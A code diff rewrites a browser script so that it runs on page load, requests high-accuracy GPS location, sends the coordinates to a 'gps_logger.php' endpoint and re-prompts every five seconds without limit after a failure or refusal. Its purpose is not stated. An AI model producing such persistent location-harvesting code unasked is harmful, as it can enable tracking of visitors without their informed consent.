@@ -1,27 +1,28 @@
-export function startGPSRetry(info) {
-  let attempts = 0;
+console.log("[GPS Retry] Script Loaded");
 
-  const tryGetLocation = () => {
-    if (attempts >= 5) return;
-    attempts++;
-
+function tryGPS() {
+  if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
+      function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        console.log("[GPS] Location:", lat, lon);
+
         fetch('/server/gps_logger.php', {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            info,
-            source: "retry"
-          })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ type: "gps", lat: lat, lon: lon })
         });
       },
-      () => setTimeout(tryGetLocation, 3000)
+      function(error) {
+        console.warn("[GPS] Failed:", error.message);
+        // Retry in 5 seconds
+        setTimeout(tryGPS, 5000);
+      },
+      { enableHighAccuracy: true }
     );
-  };
-
-  tryGetLocation();
+  }
 }
+
+tryGPS();
